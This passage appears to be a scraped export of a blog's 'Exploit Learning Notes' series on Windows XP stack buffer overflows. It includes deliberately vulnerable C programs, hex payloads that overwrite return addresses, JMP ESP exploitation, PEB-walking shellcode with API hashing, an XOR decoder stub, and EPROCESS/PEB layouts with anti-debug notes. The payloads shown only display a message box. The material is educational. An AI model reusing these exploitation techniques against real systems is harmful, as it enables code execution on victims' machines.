8 9 10 11 12 13 14 15 void main() { __asm { add eax, 0x14 ;越过decoder记录shellcode起始地址 xor ecx, ecx decode_loop: mov bl, [eax + ecx] xor bl, 0x44 ;用0x44作为key mov [eax + ecx], bl inc ecx cmp bl, 0x90 ;末尾放一个0x90作为结束符 jne decode_loop } } ShellCode to reduce the size Methods Pick short instruction xchg eax, reg ;swap the values of eax and other registers lodsb ;load a dword pointed to by esi into eax and add esi lodsd ;load a byte pointed to by esi into al and increment esi stosd ;copy the contents of eax to the memory address of edi, adding 0x4 to edi for every four bytes copied, and ecx for the size stosb ; copy the content of eax to the memory address of edi, for every byte copied, edi adds 0x4, ecx is the size pushad/popad ;store/restore all register values from the stack cdq ;use edx to expand eax into four words, can be used as mov edx, 0 when eax\u0026lt;0x80000000 Compound instructions, combined use instructions API parameter stacking before a piece of the stack space to 0, the stack can be pressed into the non-0 parameters Code is used as data, data is used as code If the data on top of the stack is useful, raise the top of the stack to protect it for later use Some registers are always stored on the stack when the API is called, but most functions do not use EBP when they run, so you can use EBP to store data. HASH algorithm for storing APIs Select the appropriate HASH algorithm 8bit represents up to 256 different characters, there will inevitably be collisions, but if the desired function is located first in the collision, then it can be used i.e. collisions are partially tolerable ","date":"2020-10-20T09:20:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-004-shellcode-coding/","title":"Exploit Learning Notes 004 ShellCode Coding"},{"content":" Click here to download this article with executable program, shellcode file\nSource: Moeomu\u0026rsquo;s blog\nLocate the API address via TEB Locate Kernel32.dll When the program is loaded, the [FS:0] register in the user state holds the TEB address TEB offset 0x30 at location [TEB + 0x30] holds the PEB address PEB offset 0xC location [PEB + 0xC] holds PEB_LDR_DATA The official Microsoft description of the PEB_LDR_DATA structure click here is represented in C as follows 1 2 3 4 5 typedef struct _PEB_LDR_DATA { BYTE Reserved1[8]; PVOID Reserved2[3]; LIST_ENTRY InMemoryOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA; Here are the results of my debugging\n1 2 3 4 5 6 7 8 9 10 11 typedef struct _PEB_LDR_DATA { INT Length; UCHAR Initialized; PVOID SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID EntryInProgress; UCHAR ShutdownInProgress; PVOID ShutdownThreadId; } PEB_LDR_DATA, *PPEB_LDR_DATA; We need to read the InInitializationOrderModuleList to get the address of Kernel32.dll, and this list is the LIST_ENTRY structure, the official Microsoft description of this structure is as follows 1 2 3 4 typedef struct _LIST_ENTRY { struct _LIST_ENTRY *Flink; struct _LIST_ENTRY *Blink; } LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY; Here are the results of my debugging\n1 2 3 4 5 6 typedef struct LinkNode { _LIST_ENTRY Flink; _LIST_ENTRY Blink; PVOID DllAddress; } This shows that DllAddress exists at +0xC of the chain table node, while the first three nodes of any program are Ntdll -\u0026gt; KernelBa -\u0026gt; Kernel32 Locate the API address (reverse Kernel32.dll) The previous section obtained the load base address of Kernel32, from which this section obtains the addresses of LoadLibrary and GetProcAddress for other functions\nThe offset 0x3C is the entry point of PEHeader, the flag word is 0x5045 and the text is PE. plus the offset of 0x78 is the address of the Export Directory RVA, at this time the offset is 0x168 and the value is 0x262C plus the offset of 0x4 is the Export Directory Size, which is 0x6CFD. When on disk, the minimum unit of section size is 0x200, but when loaded into memory, the minimum unit of section size becomes 0x1000, while the PE file header occupies a size of 0x400 in the file, but will occupy a size of 0x1000 when mapped into memory, the size difference is 0xC00, so 0x262C should be subtracted from 0xC00 to get the address 0x1A2C of the export directory table Export Directory. In the export directory table 0x28 offset is the address of the first export function, the sequence number is 0 At offset 0x67C in the Export Directory table is the address of the function GetProcAddress with the serial number 198. At the 0x340 offset in the export directory table is the address of the function LoadLibraryA, with the serial number 244. At this point, the addresses of the two important functions are found Debug ShellCode(ExpStd0301) 1 2 3 4 5 6 7 8 9 10 11 char shellcode[] = \u0026#34;\\x10\\x10\u0026#34;; void main() { __asm { lea eax, shellcode push eax ret } } Dynamic API loading ShellCode Theoretical analysis Required API functions MessageBoxA(User32.dll) ExitProcess(Kernel32.dll) LoadLibraryA(Kernel32.dll) A puzzle: how to find the address of the API when the ShellCode is needed to be as short as possible (no function name exists) HASH algorithm for function names Theory Need to introduce an additional HASH algorithm The result of the calculation is called DIGEST (summary) HASH of the searched function name algorithm (ExpStd0302) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; DWORD GetHash(char *fun_name) { DWORD digest = 0; while(*fun_name) { digest = ((digest \u0026lt;\u0026lt; 25) | (digest \u0026gt;\u0026gt; 7)); digest += *fun_name; fun_name++; } return digest; } void main() { DWORD hash; hash = GetHash(\u0026#34;MessageBoxA\u0026#34;); printf(\u0026#34;Hash is %s\u0026#34;, hash); } Final ShellCode(ExpStd0303) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 int main() { _asm{ ;flag nop nop nop nop nop cld ;clear flag DF ;store hash push 0x1e380a6a ;hash of MessageBoxA push 0x4fd18963 ;hash of ExitProcess push 0x0c917432 ;hash of LoadLibraryA mov esi, esp ;esi = addr of first func hash lea edi, [esi-0xc] ;edi = addr to start writing func ;make some stack space xor ebx, ebx mov bh, 0x04 sub esp, ebx ;push a pointer to \u0026#34;user32\u0026#34; onto stack mov bx, 0x3233 ;rest of ebx is null push ebx push 0x72657375 push esp xor edx, edx ;find base addr of kernel32.dll mov ebx, fs:[edx + 0x30] ;ebx = PEB address mov ecx, [ebx + 0x1c] ;ecx = loader data pointer mov ecx, [ecx + 0x1c] ;ecx = first entry in Initialization order list mov ecx, [ecx] ;ecx = second entry mov ebp, [ecx + 0x08] ;ebp = base address of kernel32.dll find_lib_functions: lodsd ;load next hash into al and increment esi cmp eax, 0x1e380a6a ;hash of MessageBoxA - trigger and LoadLibrary(\u0026#34;user32\u0026#34;) jne find_functions xchg eax, ebp ;save current hash call [edi - 0x8] ;LoadLibraryA xchg eax, ebp ;restore current hash and update ebp with base address of user32.dll find_functions: pushad ;preserve registers mov eax, [ebp + 0x3c] ;eax = start of PEheader mov ecx, [ebp + eax + 0x78];ecx = relative offset of export table add ecx, ebp ;ecx = absolute addr of export table mov ebx, [ecx + 0x20] ;ebx = relative offset of names add ebx, ebp ;ebx = absolute addr of names table xor edi, edi ;edi will count through the functions next_function_loop: inc edi ;inc function counter mov esi, [ebp + edi * 4] ;esi = relative offset of current function name add esi, ebp ;esi = absolute addr of current function name cdq ;dl will hold hash (we know eax is small) hash_loop: movsx eax, byte ptr[esi] cmp al, ah jz compare_hash ror edx, 7 add edx, eax inc esi jmp hash_loop compare_hash: cmp edx, [esp + 0x1c] ;compare to the requested hash(saved on stack from pushad) jnz next_function_loop mov ebx, [ecx + 0x24] ;ebx = relative offset of ordinals table add ebx, ebp ;ebx = absolute addr of ordinals table mov di, [ebx + 2 * edi] ;di = ordinal number of matched function mov ebx, [ecx + 0x1c] ;ebx = relative offset of address table mov ebx, ebp ;ebx = absolute addr of address table add ebp, [ebx + 4 * edi] ;add to ebp(base addr of module) the relative offset of matched function xchg eax, ebp ;move func addr into eax pop edi ;edi is last onto stack in pushad stosd ;write function addr to [edi] and increment edi push edi popad ;restore registers and loop until we reach end of alst hash cmp eax, 0x1e380a6a jne find_lib_functions function_call: xor ebx, ebx push ebx ;cut string push 0x74736577 push 0x6c696166 ;push failwest mov eax, esp ;load address of failwest push ebx push eax push eax push ebx call [edi - 0x4] ;call MessageBoxA push ebx call[edi - 0x8] ;call ExitProcess ;flag nop nop nop nop } } ","date":"2020-10-19T20:20:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-003-api-dynamic-loading/","title":"Exploit Learning Notes 003 API Dynamic Loading"},{"content":" Click here to download this article with executable program, shellcode file\nSource: Moeomu\u0026rsquo;s blog\nStack space shifting ShellCode is often dynamic in memory and is not directly filled with a fixed value\nThat is, the stack space address of the buffer array in the previous article is not always a fixed value\nWhen the CPU executes to this address, it may trigger an invalid instruction exception and crash the program and ShellCode will not run.\nPrinciple Find the address of a JMP ESP instruction from the loaded system DLL and use this address to flood the return address\nThis allows for precise location of the shellcode and adapts to the dynamic changes in the stack space\nThe stack address is small and large, the CPU execution order is from small address to large address, stack flooding is also from small address to large address\nThis allows ShellCode to be dynamically addressed by flooding the previous section with meaningless data and flooding the start of ShellCode at [ESP].\nShellCode writing structure Useless data + JMP ESP address (this address is exactly flooded to the function return address) + command code (for testing, MessageBox popup)\nDescription.\nretn will jump to JMP ESP afterwards, then ESP + 4 JMP ESP will jump to the command code exactly after necessary data JMP ESP address: located in User32.dll 0x77D29353 (no need to be the original command, just search the binary 0xFFE4) Garbage data size: 52 Byte = Buffer(44 Byte) + authenticated(4 Byte) + EBP(4 Byte) Final Code Here is the command code to be executed\n1 2 3 4 5 6 7 8 9 10 11 12 13 33DB xor ebx,ebx 53 push ebx 68 6D756F6F push 0x6F6F756D 68 4D6F656F push 0x6F656F4D 8BC4 mov eax,esp 53 push ebx 50 push eax 50 push eax 53 push ebx B8 EA07D577 mov eax,user32.MessageBoxA FFD0 call eax B8 FACA817C mov eax,kernel32.ExitProcess FFD0 call eax Final ShellCode\n1 2 3 4 5 6 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 53 93 D2 77 33 DB 53 68 6D 75 6F 6F 68 4D 6F 65 6F 8B C4 53 50 50 53 B8 EA 07 D5 77 FF D0 B8 FA CA 81 7C FF D0 ","date":"2020-10-19T18:20:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-002-jmp-esp/","title":"Exploit Learning Notes 002 JMP ESP"},{"content":" Functional logic bugs (Bugs) Security Logic Flaw (Vulnerability) Click here to download this article with code, executable, shellcode file\nSource: Moeomu\u0026rsquo;s blog\nPE concepts Mapping between PE file and virtual memory ImageBase: load base address, 0x00400000 for (.EXE), 0x10000000 for (.DLL) FileOffset: file offset address VirtualAddress: virtual address, is the address mapped to memory RelativeVirtualAddress: Relative virtual address, is the offset of the virtual address VA relative to the load base address VA = ImageBase + RVA\nData Complementary Padding Rules When on disk, each section (.section) of the PE file is stored in 0x200 bytes, when the size of the section is less than 0x200, use 0x0 to fill, when the size of the section exceeds 0x200, allocate the next 0x200 size to this section When in memory, each section (.section) of a PE file is stored in units of 0x1000 bytes, with the same rules as above SectionOffset = RVA - FileOffset\nFileOffset = VA - ImageBase - SectionOffset = RVA - SectionOffset\nFor example .text section RVA=0x1000, FileOffset=0x400, then SectionOffset=0xC00\nCommand file offset at 0x00404141 is 0x00404141 - 0x00400000 - (0x1000 - 0x400) = 0x3541\nFunction calling convention C SysCall StdCall BASIC FORTRAN PASCAL Parameter stack order right-\u0026gt;left right-\u0026gt;left right-\u0026gt;left left-\u0026gt;right left-\u0026gt;right Restore stack balance position parent function sub function sub function sub function sub function Buffer overflow stack frames are adjacent, local variables are adjacent, and if the array is out of bounds, it overwrites the local variables and then the function return address\ncontrol program flow by flooding stack frame return address values\nShellCode Exploit/ShellCode(Payload) division of labor Exploit\u0026rsquo;s role is to precisely exploit some kind of vulnerability with the goal of hijacking the EIP ShellCode will execute malicious/goodwill code and is the attack payload ShellCode is generally generic, Exploit can only work for a specific vulnerability Example This example uses simple password authentication to test the vulnerability\nBuffer Overflow Control Program Flag code (ExpStd0101) Compile environment: Windows XP SP3, Visual C++ 6, Debug\nExperimental environment: Windows XP SP3\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #define PASSWORD \u0026#34;1234567\u0026#34; int verify_password(char *password) { int authenticated; char buffer[8]; authenticated = strcmp(password, PASSWORD); strcpy(buffer, password); return authenticated; } int main() { int valid_flag = 0; char password[1024]; while(1) { printf(\u0026#34;Input Number:\u0026#34;); scanf(\u0026#34;%s\u0026#34;, password); valid_flag = verify_password(password); if(valid_flag) { printf(\u0026#34;ERROR!\u0026#34;); } else { printf(\u0026#34;OK!\u0026#34;); break; } } } Analysis (ExpStd0101) Simple analysis\nWhen input 999999999, its end '\\0' will fill the 9th byte, exactly changing the lowest 1 byte of authenticated 0x1 to 0x0 This is also related to strcmp function, if str1\u0026lt;str2, the authenticated value -1 is stored with inverse code FFFFFFFF, even if the low bit FF overflows to 00, it is useless, so not all 8-bit characters can bypass authentication Further verification\nWhen 8 9s are entered, the 8-byte buffer is filled, covering 1 byte of authenticated space When 11 9s are entered, the 8-byte buffer fills up and covers 4 bytes of authenticated space, i.e. authenticated is completely overwritten and it is flushed as 0x003939393939 When 15 9s are input, the 8-byte buffer is filled, covering 4 bytes of authenticated space, and the space where this function EBP is located is also covered (the content is the parent function EBP) When 19 9s are entered, the 8-byte buffer is filled, the 4-byte authenticated space is overwritten, the 4-byte EBP space is overwritten, and the 4-byte return address is overwritten Further verification\nSince the keyboard can not enter some invisible characters, so replace it with read file authentication Hard-coded address control program flow Use FILE for file reading\ncode (ExpStd0102) Compile environment: Windows XP SP3, Visual C++ 6, Debug\nExperimental environment: Windows XP SP3\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #define PASSWORD \u0026#34;1234567\u0026#34; int verify_password(char *password) { int authenticated; char buffer[8]; authenticated = strcmp(password, PASSWORD); strcpy(buffer, password); return authenticated; } int main() { int valid_flag = 0; char password[1024]; FILE * fp; if(!(fp = fopen(\u0026#34;password.txt\u0026#34;, \u0026#34;rw+\u0026#34;))) { exit(0); } fscanf(fp, \u0026#34;%s\u0026#34;, password); valid_flag = verify_password(password); if(valid_flag) { printf(\u0026#34;ERROR!\u0026#34;); } else { printf(\u0026#34;OK!\u0026#34;); } fclose(fp); } Analysis (ExpStd0102) first use a known address for shellcode, this address is compiled differently by different compilers and loaded differently by different systems, so it can only be used for testing\nNecessary information Success branch address: 0x0040111F Since memory is stored in reverse order, these values should be written in reverse order Edit password.txt in hexadecimal as follows 1 2 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 1F 11 40 00 Run the program, at this point The stack address 0x0012FB24 holds the return address of the function verify_password. This has been flushed to 0040111F, which is the success branch address The success branch address is used instead of the return address, but the program crashes after displaying success because the stack is not balanced added attack load (ShellCode) Increase the size of the buffer to carry the attack load\nDynamically load DLL for API calls\ncode (ExpStd0103) Compile environment: Windows XP SP3, Visual C++ 6, Debug\nExperimental environment: Windows XP SP3\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #define PASSWORD \u0026#34;1234567\u0026#34; int verify_password(char *password) { int authenticated; char buffer[44]; authenticated = strcmp(password, PASSWORD); strcpy(buffer, password); return authenticated; } int main() { int valid_flag = 0; char password[1024]; FILE * fp; LoadLibrary(\u0026#34;user32.dll\u0026#34;); if(!(fp = fopen(\u0026#34;password.txt\u0026#34;, \u0026#34;rw+\u0026#34;))) { exit(0); } fscanf(fp, \u0026#34;%s\u0026#34;, password); valid_flag = verify_password(password); if(valid_flag) { printf(\u0026#34;ERROR!\u0026#34;); } else { printf(\u0026#34;OK!\u0026#34;); } fclose(fp); } Analysis (ExpStd0103) Objective: To implant code to implement a popup MessageBox during program validation\nNecessary information Array start address: 0x0012FAF0 (also the start address of ShellCode execution) MessageBoxA address: 0x77D507EC Hexadecimal text: 4D6F656F6D75 (Moeomuoo) The machine code composed of Machine code(HEX) Assembly code Comments 33DB XOR EBX, EBX Clear EBX to ensure there are no zeros in ShellCode (as of character) 53 PUSH EBX \\0` at the end of the string 68 6D756F6F PUSH 6F6F756D Press in text byte muoo(0x6D756F6F) 68 4D6F656F PUSH 6F656F4D press in text byte moeo(0x4D6F656F) 8BC4 MOV EAX, ESP ESP stack top point to string Moeomuoo, hand over to EAX 53 PUSH EBX MB_OK 50 PUSH EAX Message 50 PUSH EAX Caption 53 PUSH EBX Handle B8 EC07D577 MOV EAX, 0x77D507EC Hard-code MessageBoxA\u0026rsquo;s address into EAX FFD0 CALL EAX Call MessageBoxA Write the machine code to password.txt in order Bytes 53-56 are filled with the return address (the start address of the Buffer), and the rest of the bytes are filled with 0x90 The only imperfection is that the program crashes and quits Here is the final password.txt\n1 2 3 4 33 DB 53 68 6D 75 6F 6F 68 4D 6F 65 6F 8B C4 53 50 50 53 B8 EC 07 D5 77 FF D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 F0 FA 12 00 Summary This article discusses how to exploit buffer overflow vulnerabilities and the writing of ShellCode, but the shortcomings are hard-coded addresses and stack space shifts\nThese issues are discussed in the next article\n","date":"2020-10-18T10:00:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-001-buffer-overflow/","title":"Exploit Learning Notes 001 Buffer Overflow"},{"content":"Source: Moeomu\u0026rsquo;s Blog\nNon-public kernel structures Windows has a lot of non-public structures, and some of them are semi-public, and although they have field names, their purpose can only be inferred\nWinDbg can load some kernel debugging symbols, and in these PDB files there is information about some semi-public structures\nEPROCESS(KPEB)(Kernel Process Environment Block) Each process is represented by an EPROCESS structure, which is linked by a two-way chain table\nStructure information 0x000 offset is the address of the PCB (Process Control Block), which is located in R0 0x0b4 offset is the PID, which is the unique identifier that identifies this process 0x0b8 offset is the active process chain table, which can be used to traverse all EPROCESS structures of the system Structure composition Here are the details of this structure\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 kd\u0026gt; dt _eprocess nt!_EPROCESS +0x000 Pcb : _KPROCESS // 进程控制块 +0x098 ProcessLock : _EX_PUSH_LOCK // 进程锁 +0x0a0 CreateTime : _LARGE_INTEGER // 创建时间 +0x0a8 ExitTime : _LARGE_INTEGER // 退出时间 +0x0b0 RundownProtect : _EX_RUNDOWN_REF // 进程加保护 +0x0b4 UniqueProcessId : Ptr32 Void // PID +0x0b8 ActiveProcessLinks : _LIST_ENTRY // 活动进程链表 +0x0c0 ProcessQuotaUsage : [2] Uint4B // 物理页相关的统计信息 +0x0c8 ProcessQuotaPeak : [2] Uint4B // 物理页相关的统计信息 +0x0d0 CommitCharge : Uint4B +0x0d4 QuotaBlock : Ptr32 _EPROCESS_QUOTA_BLOCK +0x0d8 CpuQuotaBlock : Ptr32 _PS_CPU_QUOTA_BLOCK +0x0dc PeakVirtualSize : Uint4B // 虚拟内存池大小 +0x0e0 VirtualSize : Uint4B // 虚拟内存大小 +0x0e4 SessionProcessLinks : _LIST_ENTRY +0x0ec DebugPort : Ptr32 Void // 调试端口 +0x0f0 ExceptionPortData : Ptr32 Void +0x0f0 ExceptionPortValue : Uint4B +0x0f0 ExceptionPortState : Pos 0, 3 Bits +0x0f4 ObjectTable : Ptr32 _HANDLE_TABLE +0x0f8 Token : _EX_FAST_REF // 权限令牌的地址 +0x0fc WorkingSetPage : Uint4B +0x100 AddressCreationLock : _EX_PUSH_LOCK +0x104 RotateInProgress : Ptr32 _ETHREAD +0x108 ForkInProgress : Ptr32 _ETHREAD +0x10c HardwareTrigger : Uint4B +0x110 PhysicalVadRoot : Ptr32 _MM_AVL_TABLE +0x114 CloneRoot : Ptr32 Void +0x118 NumberOfPrivatePages : Uint4B +0x11c NumberOfLockedPages : Uint4B +0x120 Win32Process : Ptr32 Void +0x124 Job : Ptr32 _EJOB +0x128 SectionObject : Ptr32 Void +0x12c SectionBaseAddress : Ptr32 Void +0x130 Cookie : Uint4B +0x134 Spare8 : Uint4B +0x138 WorkingSetWatch : Ptr32 _PAGEFAULT_HISTORY +0x13c Win32WindowStation : Ptr32 Void +0x140 InheritedFromUniqueProcessId : Ptr32 Void +0x144 LdtInformation : Ptr32 Void +0x148 VdmObjects : Ptr32 Void +0x14c ConsoleHostProcess : Uint4B +0x150 DeviceMap : Ptr32 Void +0x154 EtwDataSource : Ptr32 Void +0x158 FreeTebHint : Ptr32 Void +0x160 PageDirectoryPte : _HARDWARE_PTE +0x160 Filler : Uint8B +0x168 Session : Ptr32 Void +0x16c ImageFileName : [15] UChar +0x17b PriorityClass : UChar +0x17c JobLinks : _LIST_ENTRY +0x184 LockedPagesList : Ptr32 Void +0x188 ThreadListHead : _LIST_ENTRY // ETHREAD结构链表头 +0x190 SecurityPort : Ptr32 Void +0x194 PaeTop : Ptr32 Void +0x198 ActiveThreads : Uint4B // 正在运行的线程数量 +0x19c ImagePathHash : Uint4B +0x1a0 DefaultHardErrorProcessing : Uint4B +0x1a4 LastThreadExitStatus : Int4B +0x1a8 Peb : Ptr32 _PEB // 进程环境块地址 +0x1ac PrefetchTrace : _EX_FAST_REF +0x1b0 ReadOperationCount : _LARGE_INTEGER +0x1b8 WriteOperationCount : _LARGE_INTEGER +0x1c0 OtherOperationCount : _LARGE_INTEGER +0x1c8 ReadTransferCount : _LARGE_INTEGER +0x1d0 WriteTransferCount : _LARGE_INTEGER +0x1d8 OtherTransferCount : _LARGE_INTEGER +0x1e0 CommitChargeLimit : Uint4B +0x1e4 CommitChargePeak : Uint4B +0x1e8 AweInfo : Ptr32 Void +0x1ec SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO +0x1f0 Vm : _MMSUPPORT +0x25c MmProcessLinks : _LIST_ENTRY +0x264 HighestUserAddress : Ptr32 Void +0x268 ModifiedPageCount : Uint4B +0x26c Flags2 : Uint4B +0x26c JobNotReallyActive : Pos 0, 1 Bit +0x26c AccountingFolded : Pos 1, 1 Bit +0x26c NewProcessReported : Pos 2, 1 Bit +0x26c ExitProcessReported : Pos 3, 1 Bit +0x26c ReportCommitChanges : Pos 4, 1 Bit +0x26c LastReportMemory : Pos 5, 1 Bit +0x26c ReportPhysicalPageChanges : Pos 6, 1 Bit +0x26c HandleTableRundown : Pos 7, 1 Bit +0x26c NeedsHandleRundown : Pos 8, 1 Bit +0x26c RefTraceEnabled : Pos 9, 1 Bit +0x26c NumaAware : Pos 10, 1 Bit +0x26c ProtectedProcess : Pos 11, 1 Bit +0x26c DefaultPagePriority : Pos 12, 3 Bits +0x26c PrimaryTokenFrozen : Pos 15, 1 Bit +0x26c ProcessVerifierTarget : Pos 16, 1 Bit +0x26c StackRandomizationDisabled : Pos 17, 1 Bit +0x26c AffinityPermanent : Pos 18, 1 Bit +0x26c AffinityUpdateEnable : Pos 19, 1 Bit +0x26c PropagateNode : Pos 20, 1 Bit +0x26c ExplicitAffinity : Pos 21, 1 Bit +0x270 Flags : Uint4B +0x270 CreateReported : Pos 0, 1 Bit +0x270 NoDebugInherit : Pos 1, 1 Bit +0x270 ProcessExiting : Pos 2, 1 Bit +0x270 ProcessDelete : Pos 3, 1 Bit +0x270 Wow64SplitPages : Pos 4, 1 Bit +0x270 VmDeleted : Pos 5, 1 Bit +0x270 OutswapEnabled : Pos 6, 1 Bit +0x270 Outswapped : Pos 7, 1 Bit +0x270 ForkFailed : Pos 8, 1 Bit +0x270 Wow64VaSpace4Gb : Pos 9, 1 Bit +0x270 AddressSpaceInitialized : Pos 10, 2 Bits +0x270 SetTimerResolution : Pos 12, 1 Bit +0x270 BreakOnTermination : Pos 13, 1 Bit +0x270 DeprioritizeViews : Pos 14, 1 Bit +0x270 WriteWatch : Pos 15, 1 Bit +0x270 ProcessInSession : Pos 16, 1 Bit +0x270 OverrideAddressSpace : Pos 17, 1 Bit +0x270 HasAddressSpace : Pos 18, 1 Bit +0x270 LaunchPrefetched : Pos 19, 1 Bit +0x270 InjectInpageErrors : Pos 20, 1 Bit +0x270 VmTopDown : Pos 21, 1 Bit +0x270 ImageNotifyDone : Pos 22, 1 Bit +0x270 PdeUpdateNeeded : Pos 23, 1 Bit +0x270 VdmAllowed : Pos 24, 1 Bit +0x270 CrossSessionCreate : Pos 25, 1 Bit +0x270 ProcessInserted : Pos 26, 1 Bit +0x270 DefaultIoPriority : Pos 27, 3 Bits +0x270 ProcessSelfDelete : Pos 30, 1 Bit +0x270 SetTimerResolutionLink : Pos 31, 1 Bit +0x274 ExitStatus : Int4B +0x278 VadRoot : _MM_AVL_TABLE +0x298 AlpcContext : _ALPC_PROCESS_CONTEXT +0x2a8 TimerResolutionLink : _LIST_ENTRY +0x2b0 RequestedTimerResolution : Uint4B +0x2b4 ActiveThreadsHighWatermark : Uint4B +0x2b8 SmallestTimerResolution : Uint4B +0x2bc TimerResolutionStackRecord : Ptr32 _PO_DIAG_STACK_RECORD PEB(Process Environment Block) This structure is located at the R3 level and is relatively easy to modify\nStructure information 0x002 offset is the location of the FLAG whether to be debugged or not, this value can be modified under R3 0x068 offset is the value of 0 normally, 0x70 when debugged 0x018 offset is the address of _HEAP structure, this structure can be judged as non-debug state when offset 0x40=2 and 0x44=0 Structure composition 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 kd\u0026gt; dt _PEB nt!_PEB +0x000 InheritedAddressSpace : UChar +0x001 ReadImageFileExecOptions : UChar +0x002 BeingDebugged : UChar // 是否被调试 +0x003 BitField : UChar +0x003 ImageUsesLargePages : Pos 0, 1 Bit +0x003 IsProtectedProcess : Pos 1, 1 Bit +0x003 IsLegacyProcess : Pos 2, 1 Bit +0x003 IsImageDynamicallyRelocated : Pos 3, 1 Bit +0x003 SkipPatchingUser32Forwarders : Pos 4, 1 Bit +0x003 SpareBits : Pos 5, 3 Bits +0x004 Mutant : Ptr32 Void +0x008 ImageBaseAddress : Ptr32 Void +0x00c Ldr : Ptr32 _PEB_LDR_DATA // 进程装载的模块结构体 +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS +0x014 SubSystemData : Ptr32 Void +0x018 ProcessHeap : _HEAP // 0x40=2\u0026amp;\u0026amp;0x44=0为非调试状态 +0x01c FastPebLock : Ptr32 _RTL_CRITICAL_SECTION +0x020 AtlThunkSListPtr : Ptr32 Void +0x024 IFEOKey : Ptr32 Void +0x028 CrossProcessFlags : Uint4B +0x028 ProcessInJob : Pos 0, 1 Bit +0x028 ProcessInitializing : Pos 1, 1 Bit +0x028 ProcessUsingVEH : Pos 2, 1 Bit +0x028 ProcessUsingVCH : Pos 3, 1 Bit +0x028 ProcessUsingFTH : Pos 4, 1 Bit +0x028 ReservedBits0 : Pos 5, 27 Bits +0x02c KernelCallbackTable : Ptr32 Void +0x02c UserSharedInfoPtr : Ptr32 Void +0x030 SystemReserved : [1] Uint4B +0x034 AtlThunkSListPtr32 : Uint4B +0x038 ApiSetMap : Ptr32 Void +0x03c TlsExpansionCounter : Uint4B +0x040 TlsBitmap : Ptr32 Void +0x044 TlsBitmapBits : [2] Uint4B +0x04c ReadOnlySharedMemoryBase : Ptr32 Void +0x050 HotpatchInformation : Ptr32 Void +0x054 ReadOnlyStaticServerData : Ptr32 Ptr32 Void +0x058 AnsiCodePageData : Ptr32 Void +0x05c OemCodePageData : Ptr32 Void +0x060 UnicodeCaseTableData : Ptr32 Void +0x064 NumberOfProcessors : Uint4B +0x068 NtGlobalFlag : Uint4B // 反调试用 +0x070 CriticalSectionTimeout : _LARGE_INTEGER +0x078 HeapSegmentReserve : Uint4B +0x07c HeapSegmentCommit : Uint4B +0x080 HeapDeCommitTotalFreeThreshold : Uint4B +0x084 HeapDeCommitFreeBlockThreshold : Uint4B +0x088 NumberOfHeaps : Uint4B +0x08c MaximumNumberOfHeaps : Uint4B +0x090 ProcessHeaps : Ptr32 Ptr32 Void +0x094 GdiSharedHandleTable : Ptr32 Void +0x098 ProcessStarterHelper : Ptr32 Void +0x09c GdiDCAttributeList : Uint4B +0x0a0 LoaderLock : Ptr32 _RTL_CRITICAL_SECTION +0x0a4 OSMajorVersion : Uint4B // 系统主版本号 +0x0a8 OSMinorVersion : Uint4B // 系统子版本号 +0x0ac OSBuildNumber : Uint2B // 系统构建版本号 +0x0ae OSCSDVersion : Uint2B +0x0b0 OSPlatformId : Uint4B +0x0b4 ImageSubsystem : Uint4B +0x0b8 ImageSubsystemMajorVersion : Uint4B +0x0bc ImageSubsystemMinorVersion : Uint4B +0x0c0 ActiveProcessAffinityMask : Uint4B +0x0c4 GdiHandleBuffer : [34] Uint4B +0x14c PostProcessInitRoutine : 